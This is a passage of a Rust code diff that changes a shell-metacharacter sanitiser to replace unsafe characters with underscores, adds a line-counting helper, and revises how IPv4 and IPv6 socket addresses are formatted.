             '\n' | '\r' | '\t' => ' ',
-            // Dangerous shell metacharacters
-            '|' | '&' | ';' | '(' | ')' | '<' | '>' | '`' | '$' | '!' | '\\' => '?',
-            // Quotes that could break argument parsing
-            '"' | '\'' => '?',
-            // Control characters (excluding \n, \r, \t which are handled above)
-            // \x00-\x08, \x0b-\x0c, \x0e-\x1f, \x7f
-            '\x00'..='\x08' | '\x0b'..='\x0c' | '\x0e'..='\x1f' | '\x7f' => '?',
-            // Extended ASCII control characters
-            '\u{0080}'..='\u{009f}' => '?',
-            // Safe characters
+            '|' | '&' | ';' | '(' | ')' | '<' | '>' | '`' | '$' | '!' | '\\' => '_',
+            '"' | '\'' => '_',
+            '\x00'..='\x08' | '\x0b'..='\x0c' | '\x0e'..='\x1f' | '\x7f' => '_',
+            '\u{0080}'..='\u{009f}' => '_',
             c => c,
         })
         .collect()
@@ -1003,6 +1015,14 @@ fn should_use_streaming<P: AsRef<Path>>(path: P) -> Result<bool> {
     let metadata = std::fs::metadata(path.as_ref())
         .map_err(|e| anyhow!("Failed to get file metadata: {}", e))?;
     Ok(metadata.len() > MAX_MEMORY_LOAD_SIZE)
+}
+
+/// Count lines in a file without loading entire file into memory
+fn count_lines<P: AsRef<Path>>(path: P) -> Result<usize> {
+    let file = File::open(path.as_ref())
+        .context("Failed to open file for counting lines")?;
+    let reader = BufReader::new(file);
+    Ok(reader.lines().count())
 }
 
 fn format_file_size(size: u64) -> String {
@@ -1019,10 +1039,20 @@ fn format_file_size(size: u64) -> String {
 }
 
 fn format_socket_address(ip: &str, port: u16) -> String {
-    let trimmed_ip = ip.trim_matches(|c| c == '[' || c == ']');
-    if trimmed_ip.contains(':') && !trimmed_ip.contains("]:") {
-        format!("[{}]:{}", trimmed_ip, port)
+    let ip = ip.trim();
+    
+    // Check if already formatted with port
+    if ip.ends_with(&format!("]:{}", port)) {
+        return ip.to_string();
+    }
+    
+    // Remove existing brackets if present
+    let ip_no_brackets = ip.trim_matches(|c| c == '[' || c == ']');
+    
+    // Check if it's an IPv6 address
+    if ip_no_brackets.contains(':') {
+        format!("[{}]:{}", ip_no_brackets, port)
     } else {
-        format!("{}:{}", trimmed_ip, port)
+        format!("{}:{}", ip_no_brackets, port)
     }
 }
